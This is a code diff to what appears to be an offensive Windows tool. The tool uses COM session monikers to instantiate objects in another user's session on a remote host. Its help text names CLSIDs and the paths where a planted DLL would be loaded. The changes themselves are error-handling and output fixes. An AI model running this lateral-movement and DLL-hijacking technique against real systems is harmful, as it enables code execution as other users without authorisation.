@@ -21,7 +21,7 @@ BOOL InstanciateInSession(int iSessId, WCHAR* wszCLSID, WCHAR* wszRemoteHost) {
 
 	hResult = StringCchPrintfW(wszMoniker, 59, L"session:%d!new:%ws", iSessId, wszCLSID);
 	if (FAILED(hResult)) {
-		printf("Error in StringCchPrintfW: %ld", hResult);
+		wprintf(L"Error in StringCchPrintfW: %ld\n", hResult);
 		bSTATE = FALSE; goto _EndOfFunc;
 	}
 
@@ -46,6 +46,18 @@ BOOL InstanciateInSession(int iSessId, WCHAR* wszCLSID, WCHAR* wszRemoteHost) {
 	}
 
 	hResult = CoGetObject(wszMoniker, (LPBIND_OPTS)&sctBindOps3, &IID_IUnknown, &pUnknown);
+
+	if (hResult == 0x80080005) {
+		wprintf(L"CoGetObject returned 0x80080005, should have worked!\n");
+	}
+	else if (hResult == 0x80070002) {
+		wprintf(L"Error: CoGetObject returned 0x80070002, are you sure the session exists?\n");
+
+	}
+	else if (FAILED(hResult)) {
+		wprintf(L"Error in CoGetObject: 0x%x\n", hResult);
+		bSTATE = FALSE; goto _EndOfFunc;
+	}
 
 
 _EndOfFunc:
@@ -83,12 +95,12 @@ int wmain(int argc, WCHAR* argv[]) {
 
 	hResult = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	if (FAILED(hResult)) {
-		printf("Error in CoInitializeEx: %lu", hResult);
+		wprintf(L"Error in CoInitializeEx: %lu\n", hResult);
 		return -1;
 	}
 
 	if (!InstanciateInSession(iSessId, wzsCLSID, wzsRemoteHost)) {
-		printf("Error instanciating class...");
+		wprintf(L"Error instanciating class...\n");
 	}
 
 	CoUninitialize();
@@ -105,7 +117,6 @@ VOID PrintHelp(WCHAR wszProgName[]) {
 	wprintf(L"\tUse either of these commands in runas /netonly to retrieve session IDs:\n");
 	wprintf(L"\t\tqwinsta /server:<remote_host>\n");
 	wprintf(L"\t\tquery user /server:<remote_host>\n");
-
 	wprintf(L"\n");
 	wprintf(L"\n");
 	wprintf(L"Usable CLSIDs:\n");
@@ -119,9 +130,5 @@ VOID PrintHelp(WCHAR wszProgName[]) {
 	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\dwmapi.dll\n");
 	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\UxTheme.dll\n");
 	wprintf(L"\t\tC:\\Program Files\\Windows Photo Viewer\\VERSION.dll\n");
-	wprintf(L"\n");
-	wprintf(L"\t03DE7B30-9300-4FA9-AF69-BA09497107A2 (Shared Reco Custom Marshaller COM)\n");
-	wprintf(L"\tPlace DLL at:\n");
-	wprintf(L"\t\tC:\\Windows\\System32\\Speech_OneCore\\common\\bcp47langs.dll\n");
 
 }
